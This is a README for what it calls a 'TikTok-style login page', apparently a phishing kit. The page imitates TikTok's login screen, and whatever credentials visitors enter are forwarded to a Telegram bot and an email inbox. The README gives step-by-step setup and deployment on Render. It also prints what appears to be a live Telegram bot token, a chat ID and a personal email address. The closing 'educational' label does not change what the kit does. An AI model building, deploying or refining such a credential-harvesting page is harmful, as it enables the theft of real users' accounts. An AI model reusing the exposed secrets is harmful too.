# TikTok Login Page

A professional TikTok-style login page with Telegram integration and email logging.

## 🚀 Features

- Authentic TikTok login UI design
- Responsive layout with mobile support
- Telegram bot integration
- Email notifications
- Professional footer with language and copyright
- Secure data handling

## 🛠️ Tech Stack

- **CSS3** - Modern styling with TikTok-inspired design
- **JavaScript** - Form handling and dynamic interactions
- **PHP** - Backend processing and API integrations
- **Render** - Cloud hosting and deployment

## 📦 Installation & Setup

### Prerequisites
- PHP 8.2+
- Composer
- Git

### Local Development

1. Clone the repository:
```bash
git clone <your-repo-url>
cd tiktok-login-page
```

2. Install dependencies:
```bash
composer install
```

3. Set up environment variables in `.env`:
```bash
TELEGRAM_BOT_TOKEN=8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY
TELEGRAM_CHAT_ID=6037378895
RECEIVE_EMAIL=davidmassmutual@gmail.com
```

4. Start local server:
```bash
composer run start
```

5. Visit `http://localhost:8000`

## 🚀 Deployment to Render

### Step 1: Prepare Files
All necessary deployment files are already configured:
- `composer.json` - PHP configuration
- `render.yaml` - Deployment configuration 
- `.gitignore` - Excludes sensitive files

### Step 2: Push to GitHub
```bash
git add .
git commit -m "Ready for Render deployment"
git push origin main
```

### Step 3: Deploy on Render

1. **Go to [render.com](https://render.com) and sign up**
2. **Connect your GitHub repository**
3. **Create new Web Service:**
   - Choose your repository
   - Set **Runtime** to `PHP`
   - **Build Command:** `composer install --no-dev --optimize-autoloader`
   - **Start Command:** `php -S 0.0.0.0:$PORT index.php`

### Step 4: Configure Environment Variables
In your Render dashboard, add these environment variables:
- `TELEGRAM_BOT_TOKEN` = `8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY` (mark as Secret)
- `TELEGRAM_CHAT_ID` = `6037378895` (mark as Secret)  
- `RECEIVE_EMAIL` = `davidmassmutual@gmail.com` (mark as Secret)

### Step 5: Deploy
Click **Create Web Service** and wait for deployment. You'll get a URL like `https://your-app.onrender.com`

## 🔧 Configuration

### Telegram Bot Setup
1. Message [@BotFather](https://t.me/BotFather) on Telegram
2. Create a new bot with `/newbot`
3. Get your **BOT TOKEN** and **CHAT ID**
4. Update environment variables in Render

### Email Configuration
Update `RECEIVE_EMAIL` in Render environment variables to receive login notifications.

## 📁 Project Structure

```
tiktok-login-page/
├── index.php              # Main entry point
├── next.php              # Telegram & email handler
├── data.php              # HTML template storage
├── composer.json         # PHP dependencies
├── render.yaml           # Render deployment config
├── .gitignore            # Git ignore rules
├── assets/               # Static assets
│   ├── images/           # Logo SVG files
│   └── ...               # CSS, JS if needed
└── README.md             # This file
```

## 🔒 Security Features

- Input sanitization and validation
- Secure environment variable handling
- HTTPS only (enforced by Render)
- CORS headers configured
- No sensitive data in source code

## 🌐 Live Testing

Once deployed, test your login page:
1. Visit your Render URL
2. Enter test credentials
3. Check Telegram for notifications
4. Check email for login alerts

## 📊 Monitoring

- Check `debug.log` for server logs
- Monitor Telegram bot for successful notifications
- View Render dashboard for deployment status

## 🤝 Support

For issues with:
- **Telegram bot**: Ensure bot token and chat ID are correct
- **Email delivery**: Check spam folder
- **Deployment**: Verify environment variables in Render

## 📜 License

This project is for educational and demonstration purposes.

---

**Happy deploying! 🚀**
